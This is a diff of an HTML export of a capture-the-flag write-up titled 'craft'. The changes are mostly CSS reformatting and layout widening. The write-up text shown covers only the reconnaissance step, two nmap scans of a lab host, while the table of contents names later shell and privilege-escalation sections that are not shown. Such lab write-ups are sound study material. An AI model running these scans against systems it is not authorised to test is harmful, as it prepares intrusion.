@@ -316,33 +316,34 @@ span.cm-strikethrough { text-decoration: line-through; }
 /* pt-serif-700 - latin */
 /* pt-serif-700italic - latin */
 :root {
-	--active-file-bg-color: #dadada;
-	--active-file-bg-color: rgba(32, 43, 51, 0.63);
-	--active-file-text-color: white;
-	--bg-color: #f3f2ee;
-	--text-color: #1f0909;
-	--control-text-color: #444;
-	--rawblock-edit-panel-bd: #e5e5e5;
+  --active-file-bg-color: #dadada;
+  --active-file-bg-color: rgba(32, 43, 51, 0.63);
+  --active-file-text-color: white;
+  --bg-color: #f3f2ee;
+  --text-color: #1f0909;
+  --control-text-color: #444;
+  --rawblock-edit-panel-bd: #e5e5e5;
 
-	--select-text-bg-color: rgba(32, 43, 51, 0.63);
+  --select-text-bg-color: rgba(32, 43, 51, 0.63);
   --select-text-font-color: white;
 }
 
 pre {
-	--select-text-bg-color: #36284e;
-	--select-text-font-color: #fff;
+  --select-text-bg-color: #36284e;
+  --select-text-font-color: #fff;
 }
 
 html {
-	font-size: 16px;
-	-webkit-font-smoothing: antialiased;
+  font-size: 16px;
+  -webkit-font-smoothing: antialiased;
 }
 
-html, body {
-	background-color: #f3f2ee;
-	font-family: "PT Serif", 'Times New Roman', Times, serif;
-	color: #1f0909;
-	line-height: 1.5em;
+html,
+body {
+  background-color: #f3f2ee;
+  font-family: "PT Serif", "Times New Roman", Times, serif;
+  color: #1f0909;
+  line-height: 1.5em;
 }
 
 /*#write {
@@ -359,44 +360,56 @@ html, body {
  	}
 }*/
 
+/* #write {
+  max-width: 40em;
+} */
+
+/* @media only screen and (min-width: 1400px) {
+  #write {
+    max-width: 914px;
+  }
+} */
+
+/* 강제 적용 버전 */
 #write {
-	max-width: 40em;
+  max-width: 900px !important; /* 숫자를 더 키워보세요 */
+  width: 90% !important;
 }
 
 @media only screen and (min-width: 1400px) {
-	#write {
-			max-width: 914px;
-	}
+  #write {
+    max-width: 1400px !important;
+  }
 }
 
 ol li {
-	list-style-type: decimal;
-	list-style-position: outside;
+  list-style-type: decimal;
+  list-style-position: outside;
 }
 ul li {
-	list-style-type: disc;
-	list-style-position: outside;
+  list-style-type: disc;
+  list-style-position: outside;
 }
 
 ol,
 ul {
-	list-style: none;
+  list-style: none;
 }
 
 blockquote,
 q {
-	quotes: none;
+  quotes: none;
 }
 blockquote:before,
 blockquote:after,
 q:before,
 q:after {
-	content: '';
-	content: none;
+  content: "";
+  content: none;
 }
 table {
-	border-collapse: collapse;
-	border-spacing: 0;
+  border-collapse: collapse;
+  border-spacing: 0;
 }
 /* styles */
 
@@ -410,61 +423,61 @@ h3,
 h4,
 h5,
 h6 {
-	font-weight: bold;
+  font-weight: bold;
 }
 h1 {
-	font-size: 1.875em;
-	/*30 / 16*/
-	line-height: 1.6em;
-	/* 48 / 30*/
-	margin-top: 2em;
+  font-size: 1.875em;
+  /*30 / 16*/
+  line-height: 1.6em;
+  /* 48 / 30*/
+  margin-top: 2em;
 }
 h2,
 h3 {
-	font-size: 1.3125em;
-	/*21 / 16*/
-	line-height: 1.15;
-	/*24 / 21*/
-	margin-top: 2.285714em;
-	/*48 / 21*/
-	margin-bottom: 1.15em;
-	/*24 / 21*/
+  font-size: 1.3125em;
+  /*21 / 16*/
+  line-height: 1.15;
+  /*24 / 21*/
+  margin-top: 2.285714em;
+  /*48 / 21*/
+  margin-bottom: 1.15em;
+  /*24 / 21*/
 }
 h3 {
-	font-weight: normal;
+  font-weight: normal;
 }
 h4 {
-	font-size: 1.125em;
-	/*18 / 16*/
-	margin-top: 2.67em;
-	/*48 / 18*/
+  font-size: 1.125em;
+  /*18 / 16*/
+  margin-top: 2.67em;
+  /*48 / 18*/
 }
 h5,
 h6 {
-	font-size: 1em;
-	/*16*/
+  font-size: 1em;
+  /*16*/
 }
 h1 {
-	border-bottom: 1px solid;
-	margin-bottom: 1.875em;
-	padding-bottom: 0.8125em;
+  border-bottom: 1px solid;
+  margin-bottom: 1.875em;
+  padding-bottom: 0.8125em;
 }
 /* links */
 
 a {
-	text-decoration: none;
-	color: #065588;
+  text-decoration: none;
+  color: #065588;
 }
 a:hover,
 a:active {
-	text-decoration: underline;
+  text-decoration: underline;
 }
 /* block spacing */
 
 p,
 blockquote,
 .md-fences {
-	margin-bottom: 1.5em;
+  margin-bottom: 1.5em;
 }
 h1,
 h2,
@@ -472,80 +485,86 @@ h3,
 h4,
 h5,
 h6 {
-	margin-bottom: 1.5em;
+  margin-bottom: 1.5em;
 }
 /* blockquote */
 
 blockquote {
-	font-style: italic;
-	border-left: 5px solid;
-	margin-left: 2em;
-	padding-left: 1em;
+  font-style: italic;
+  border-left: 5px solid;
+  margin-left: 2em;
+  padding-left: 1em;
 }
 /* lists */
 
 ul,
 ol {
-	margin: 0 0 1.5em 1.5em;
+  margin: 0 0 1.5em 1.5em;
 }
 /* tables */
-.md-meta,.md-before, .md-after {
-	color:#999;
+.md-meta,
+.md-before,
+.md-after {
+  color: #999;
 }
 
 table {
-	margin-bottom: 1.5em;
-	/*24 / 16*/
-	font-size: 1em;
-	/* width: 100%; */
+  margin-bottom: 1.5em;
+  /*24 / 16*/
+  font-size: 1em;
+  /* width: 100%; */
 }
 thead th,
 tfoot th {
-	padding: .25em .25em .25em .4em;
-	text-transform: uppercase;
+  padding: 0.25em 0.25em 0.25em 0.4em;
+  text-transform: uppercase;
 }
 th {
-	text-align: left;
+  text-align: left;
 }
 td {
-	vertical-align: top;
-	padding: .25em .25em .25em .4em;
+  vertical-align: top;
+  padding: 0.25em 0.25em 0.25em 0.4em;
 }
 
 code,
 .md-fences {
-	background-color: #dadada;
+  background-color: #dadada;
 }
 
 code {
-	padding-left: 2px;
-	padding-right: 2px;
+  padding-left: 2px;
+  padding-right: 2px;
 }
 
 .md-fences {
-	margin-left: 2em;
-	margin-bottom: 3em;
-	padding-left: 1ch;
-	padding-right: 1ch;
+  margin-left: 2em;
+  margin-bottom: 3em;
+  padding-left: 1ch;
+  padding-right: 1ch;
+  font-size: 0.8em;
+  margin-left: 0 !important;
+  width: 90% !important; /* 100%에서 95%로 살짝 줄임 */
+  max-width: 90% !important; /* 최대치 고정 */
 }
 
 pre,
 code,
 tt {
-	font-size: .875em;
-	line-height: 1.714285em;
+  font-size: 0.875em;
+  line-height: 1.714285em;
 }
 /* some fixes */
 
 h1 {
-	line-height: 1.3em;
-	font-weight: normal;
-	margin-bottom: 0.5em;
+  line-height: 1.3em;
+  font-weight: normal;
+  margin-bottom: 0.5em;
 }
 
 p + ul,
-p + ol{
-	margin-top: .5em;
+p + ol {
+  margin-top: 0.5em;
 }
 
 h3 + ul,
@@ -556,154 +575,155 @@ h3 + ol,
 h4 + ol,
 h5 + ol,
 h6 + ol {
-	margin-top: .5em;
+  margin-top: 0.5em;
 }
 
 li > ul,
 li > ol {
-	margin-top: inherit;
-	margin-bottom: 0;
+  margin-top: inherit;
+  margin-bottom: 0;
 }
 
-li ol>li {
-	list-style-type: lower-alpha;
+li ol > li {
+  list-style-type: lower-alpha;
 }
 
-li li ol>li{
-	list-style-type: lower-roman;
+li li ol > li {
+  list-style-type: lower-roman;
 }
 
 h2,
 h3 {
-	margin-bottom: .75em;
+  margin-bottom: 0.75em;
 }
 hr {
-	border-top: none;
-	border-right: none;
-	border-bottom: 1px solid;
-	border-left: none;
+  border-top: none;
+  border-right: none;
+  border-bottom: 1px solid;
+  border-left: none;
 }
 h1 {
-	border-color: #c5c5c5;
+  border-color: #c5c5c5;
 }
 blockquote {
-	border-color: #bababa;
-	color: #656565;
+  border-color: #bababa;
+  color: #656565;
 }
 
 blockquote ul,
 blockquote ol {
-	margin-left:0;
+  margin-left: 0;
 }
 
 .ty-table-edit {
-	background-color: transparent;
+  background-color: transparent;
 }
 thead {
-	background-color: #dadada;
+  background-color: #dadada;
 }
 tr:nth-child(even) {
-	background: #e8e7e7;
+  background: #e8e7e7;
 }
 hr {
-	border-color: #c5c5c5;
+  border-color: #c5c5c5;
 }
-.task-list{
-	padding-left: 1rem;
+.task-list {
+  padding-left: 1rem;
 }
 
 .md-task-list-item {
-	padding-left: 1.5rem;
-	list-style-type: none;
+  padding-left: 1.5rem;
+  list-style-type: none;
 }
 
 .md-task-list-item > input:before {
-	content: '\221A';
-	display: inline-block;
-	width: 1.25rem;
-  	height: 1.6rem;
-	vertical-align: middle;
-	text-align: center;
-	color: #ddd;
-	background-color: #F3F2EE;
+  content: "\221A";
+  display: inline-block;
+  width: 1.25rem;
+  height: 1.6rem;
+  vertical-align: middle;
+  text-align: center;
+  color: #ddd;
+  background-color: #f3f2ee;
 }
 
 .md-task-list-item > input:checked:before,
-.md-task-list-item > input[checked]:before{
-	color: inherit;
+.md-task-list-item > input[checked]:before {
+  color: inherit;
 }
 
 #write pre.md-meta-block {
-	min-height: 1.875rem;
-	color: #555;
-	border: 0px;
-	background: transparent;
-	margin-top: -4px;
-	margin-left: 1em;
-	margin-top: 1em;
+  min-height: 1.875rem;
+  color: #555;
+  border: 0px;
+  background: transparent;
+  margin-top: -4px;
+  margin-left: 1em;
+  margin-top: 1em;
 }
 
-.md-image>.md-meta {
-	color: #9B5146;
+.md-image > .md-meta {
+  color: #9b5146;
 }
 
-.md-image>.md-meta{
-	font-family: Menlo, 'Ubuntu Mono', Consolas, 'Courier New', 'Microsoft Yahei', 'Hiragino Sans GB', 'WenQuanYi Micro Hei', serif;
+.md-image > .md-meta {
+  font-family:
+    Menlo, "Ubuntu Mono", Consolas, "Courier New", "Microsoft Yahei",
+    "Hiragino Sans GB", "WenQuanYi Micro Hei", serif;
 }
 
-
-#write>h3.md-focus:before{
-	left: -1.5rem;
-	color:#999;
-	border-color:#999;
+#write > h3.md-focus:before {
+  left: -1.5rem;
+  color: #999;
+  border-color: #999;
 }
-#write>h4.md-focus:before{
-	left: -1.5rem;
-	top: .25rem;
-	color:#999;
-	border-color:#999;
+#write > h4.md-focus:before {
+  left: -1.5rem;
+  top: 0.25rem;
+  color: #999;
+  border-color: #999;
 }
-#write>h5.md-focus:before{
-	left: -1.5rem;
-	top: .0.3125rem;
-	color:#999;
-	border-color:#999;
+#write > h5.md-focus:before {
+  left: -1.5rem;
+  top: 0.3125rem;
+  color: #999;
+  border-color: #999;
 }
-#write>h6.md-focus:before{
-	left: -1.5rem;
-	top: 0.3125rem;
-	color:#999;
-	border-color:#999;
-}
-
-.md-toc:focus .md-toc-content{
-	margin-top: 19px;
+#write > h6.md-focus:before {
+  left: -1.5rem;
+  top: 0.3125rem;
+  color: #999;
+  border-color: #999;
 }
 
-.md-toc-content:empty:before{
-	color: #065588;
+.md-toc:focus .md-toc-content {
+  margin-top: 19px;
+}
+
+.md-toc-content:empty:before {
+  color: #065588;
 }
 .md-toc-item {
-	color: #065588;
+  color: #065588;
 }
 #write div.md-toc-tooltip {
-	background-color: #f3f2ee;
+  background-color: #f3f2ee;
 }
 
 #typora-sidebar {
-	background-color: #f3f2ee;
-	-webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
-  	box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
+  background-color: #f3f2ee;
+  -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
+  box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
 }
 
 .pin-outline #typora-sidebar {
-	background: inherit;
-	box-shadow: none;
-	border-right: 1px dashed;
+  background: inherit;
+  box-shadow: none;
+  border-right: 1px dashed;
 }
 
 .pin-outline #typora-sidebar:hover .outline-title-wrapper {
-	border-left:1px dashed;
+  border-left: 1px dashed;
 }
 
 .outline-item:hover {
@@ -713,237 +733,224 @@ hr {
 }
 
 .typora-node .outline-item:hover {
-  	border-right: 28px solid #dadada;
+  border-right: 28px solid #dadada;
 }
 
 .outline-expander:before {
   content: "\f0da";
   font-family: FontAwesome;
-  font-size:14px;
+  font-size: 14px;
   top: 1px;
 }
 
 .outline-expander:hover:before,
-.outline-item-open>.outline-item>.outline-expander:before {
+.outline-item-open > .outline-item > .outline-expander:before {
   content: "\f0d7";
 }
 
 .modal-content {
-	background-color: #f3f2ee;
+  background-color: #f3f2ee;
 }
 
 .auto-suggest-container ul li {
-	list-style-type: none;
+  list-style-type: none;
 }
 
 /** UI for electron */
 
 .megamenu-menu,
-#top-titlebar, #top-titlebar *,
+#top-titlebar,
+#top-titlebar *,
 .megamenu-content {
-	background: #f3f2ee;
-	color: #1f0909;
+  background: #f3f2ee;
+  color: #1f0909;
 }
 
 .megamenu-menu-header {
-	border-bottom: 1px dashed #202B33;
+  border-bottom: 1px dashed #202b33;
 }
 
 .megamenu-menu {
-	box-shadow: none;
-	border-right: 1px dashed;
+  box-shadow: none;
+  border-right: 1px dashed;
 }
 
-header, .context-menu, .megamenu-content, footer {
-	font-family: "PT Serif", 'Times New Roman', Times, serif;
-    color: #1f0909;
+header,
+.context-menu,
+.megamenu-content,
+footer {
+  font-family: "PT Serif", "Times New Roman", Times, serif;
+  color: #1f0909;
 }
 
 #megamenu-back-btn {
-	color: #1f0909;
-	border-color: #1f0909;
+  color: #1f0909;
+  border-color: #1f0909;
 }
 
 .megamenu-menu-header #megamenu-menu-header-title:before {
-	color: #1f0909;
+  color: #1f0909;
 }
 
-.megamenu-menu-list li a:hover, .megamenu-menu-list li a.active {
-	color: inherit;
-	background-color: #e8e7df;
+.megamenu-menu-list li a:hover,
+.megamenu-menu-list li a.active {
+  color: inherit;
+  background-color: #e8e7df;
 }
 
 .long-btn:hover {
-	background-color: #e8e7df;
+  background-color: #e8e7df;
 }
 
 #recent-file-panel tbody tr:nth-child(2n-1) {
-    background-color: transparent !important;
+  background-color: transparent !important;
 }
 
 .megamenu-menu-panel tbody tr:hover td:nth-child(2) {
-    color: inherit;
+  color: inherit;
 }
 
 .megamenu-menu-panel .btn {
-	background-color: #D2D1D1;
+  background-color: #d2d1d1;
 }
 
 .btn-default {
-	background-color: transparent;
+  background-color: transparent;
 }
 
 .typora-sourceview-on #toggle-sourceview-btn,
 .ty-show-word-count #footer-word-count {
-	background: #c7c5c5;
+  background: #c7c5c5;
 }
 
 #typora-quick-open {
-    background-color: inherit;
+  background-color: inherit;
 }
 
 .md-diagram-panel {
-	margin-top: 8px;
+  margin-top: 8px;
 }
 
 .file-list-item-file-name {
-	font-weight: initial;
+  font-weight: initial;
 }
 
 .file-list-item-summary {
-	opacity: 1;
+  opacity: 1;
 }
 
 .file-list-item {
-	color: #777;
+  color: #777;
 }
 
 .file-list-item.active {
-	background-color: inherit;
-	color: black;
+  background-color: inherit;
+  color: black;
 }
 
 .ty-side-sort-btn.active {
-	background-color: inherit;
+  background-color: inherit;
 }
 
-.file-list-item.active .file-list-item-file-name  {
-	font-weight: bold;
+.file-list-item.active .file-list-item-file-name {
+  font-weight: bold;
 }
 
-.file-list-item{
-    opacity:1 !important;
+.file-list-item {
+  opacity: 1 !important;
 }
 
-.file-library-node.active>.file-node-background{
-	background-color: rgba(32, 43, 51, 0.63);
-	background-color: var(--active-file-bg-color);
+.file-library-node.active > .file-node-background {
+  background-color: rgba(32, 43, 51, 0.63);
+  background-color: var(--active-file-bg-color);
 }
 
-.file-tree-node.active>.file-node-content{
-	color: white;
-	color: var(--active-file-text-color);
+.file-tree-node.active > .file-node-content {
+  color: white;
+  color: var(--active-file-text-color);
 }
 
-.md-task-list-item>input {
-	margin-left: -1.7em;
-	margin-top: calc(1rem - 12px);
-	-webkit-appearance: button;
+.md-task-list-item > input {
+  margin-left: -1.7em;
+  margin-top: calc(1rem - 12px);
+  -webkit-appearance: button;
 }
 
 input {
-	border: 1px solid #aaa;
+  border: 1px solid #aaa;
 }
 
 .megamenu-menu-header #megamenu-menu-header-title,
-.megamenu-menu-header:hover, 
+.megamenu-menu-header:hover,
 .megamenu-menu-header:focus {
-	color: inherit;
+  color: inherit;
 }
 
 .dropdown-menu .divider {
-	border-color: #e5e5e5;
-	opacity: 1;
+  border-color: #e5e5e5;
+  opacity: 1;
 }
 
 /* https://github.com/typora/typora-issues/issues/2046 */
 .os-windows-7 strong,
-.os-windows-7 strong  {
-	font-weight: 760;
+.os-windows-7 strong {
+  font-weight: 760;
 }
 
 .ty-preferences .btn-default {
-	background: transparent;
+  background: transparent;
 }
 
 .ty-preferences .window-header {
-	border-bottom: 1px dashed #202B33;
-	box-shadow: none;
+  border-bottom: 1px dashed #202b33;
+  box-shadow: none;
 }
 
-#sidebar-loading-template, #sidebar-loading-template.file-list-item {
-	color: #777;
+#sidebar-loading-template,
+#sidebar-loading-template.file-list-item {
+  color: #777;
 }
 
 .searchpanel-search-option-btn.active {
-	background: #777;
-	color: white;
+  background: #777;
+  color: white;
 }
 
-.export-detail, .light .export-detail, 
-.light .export-item.active, 
+.export-detail,
+.light .export-detail,
+.light .export-item.active,
 .light .export-items-list-control {
-	background: #e0e0e0;
-	border-radius: 2px;
-	font-weight: 700;
-	color: inherit
-}</style>
-<style type='text/css'  id="style-theme_user_css">/* 강제 적용 버전 */
-#write {
-    max-width: 900px !important; /* 숫자를 더 키워보세요 */
-    width: 90% !important;
+  background: #e0e0e0;
+  border-radius: 2px;
+  font-weight: 700;
+  color: inherit;
 }
-
-@media only screen and (min-width: 1400px) {
-    #write {
-        max-width: 1400px !important;
-    }
-}
-
-/* 코드 블록 강제 확장 */
-.md-fences,
-pre.md-fences,
-#write .md-fences {
-    margin-left: 0 !important;
-    margin-right: 0 !important;
-    width: 100% !important;
-    min-width: 100% !important;
-}</style>
+</style>
 <style type='text/css'  id="style-lp">ol, ul {padding-left: 40px}</style>
 
 <title>craft</title>
 </head>
 <body class='typora-export os-windows'><div class='typora-export-content'>
-<div id='write'  class=''><p><span>Writeup by wook413</span></p><div class='md-toc' mdtype='toc'><p class="md-toc-content" role="list"><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n3"><a class="md-toc-inner" href="#recon">Recon</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n4"><a class="md-toc-inner" href="#nmap">Nmap</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n9"><a class="md-toc-inner" href="#initial-access">Initial Access</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n10"><a class="md-toc-inner" href="#http-80">HTTP 80</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n24"><a class="md-toc-inner" href="#shell-as-thecybergeek">Shell as <code>thecybergeek</code></a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n31"><a class="md-toc-inner" href="#privilege-escalation">Privilege Escalation</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n50"><a class="md-toc-inner" href="#shell-as-system">Shell as <code>system</code></a></span></p></div><h1 id='recon'><span>Recon</span></h1><h2 id='nmap'><span>Nmap</span></h2><p><span>I began with a comprehensive TCP scan of all 65,535 ports. The results indicated that only port 80 is open.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-Pn</span> <span class="cm-attribute">-n</span> <span class="cm-attribute">--open</span> <span class="cm-attribute">--min-rate</span> <span class="cm-number">3000</span> <span class="cm-attribute">-p-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-17</span> <span class="cm-number">16</span>:03 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.164.169</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.046s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Not shown: <span class="cm-number">65534</span> filtered tcp ports (no-response)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Some closed ports may be reported as filtered due to <span class="cm-attribute">--defeat-rst-ratelimit</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; STATE SERVICE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp open  http</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">43</span>.88 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 272px;"></div><div class="CodeMirror-gutters" style="display: none; height: 272px;"></div></div></div></pre><p><span>As a follow up, I performed a targeted service scan and a UDP scan of the top 10 ports to ensure no overlooked services were running.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre>x</pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sC</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">-p</span> <span class="cm-number">80</span> <span class="cm-attribute">-Pn</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-17</span> <span class="cm-number">16</span>:05 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.164.169</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.045s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+<div id='write'  class=''><p><span>Writeup by wook413</span></p><div class='md-toc' mdtype='toc'><p class="md-toc-content" role="list"><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n3"><a class="md-toc-inner" href="#recon">Recon</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n4"><a class="md-toc-inner" href="#nmap">Nmap</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n10"><a class="md-toc-inner" href="#initial-access">Initial Access</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n11"><a class="md-toc-inner" href="#http-80">HTTP 80</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n25"><a class="md-toc-inner" href="#shell-as-thecybergeek">Shell as <code>thecybergeek</code></a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n32"><a class="md-toc-inner" href="#privilege-escalation">Privilege Escalation</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n51"><a class="md-toc-inner" href="#shell-as-system">Shell as <code>system</code></a></span></p></div><h1 id='recon'><span>Recon</span></h1><h2 id='nmap'><span>Nmap</span></h2><p><span>I began with a comprehensive TCP scan of all 65,535 ports. The results indicated that only port 80 is open.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-Pn</span> <span class="cm-attribute">-n</span> <span class="cm-attribute">--open</span> <span class="cm-attribute">--min-rate</span> <span class="cm-number">3000</span> <span class="cm-attribute">-p-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-17</span> <span class="cm-number">16</span>:03 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.164.169</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.046s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Not shown: <span class="cm-number">65534</span> filtered tcp ports (no-response)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Some closed ports may be reported as filtered due to <span class="cm-attribute">--defeat-rst-ratelimit</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; STATE SERVICE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp open  http</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">43</span>.88 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 241px;"></div><div class="CodeMirror-gutters" style="display: none; height: 241px;"></div></div></div></pre><p><span>As a follow up, I performed a targeted service scan and a UDP scan of the top 10 ports to ensure no overlooked services were running.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 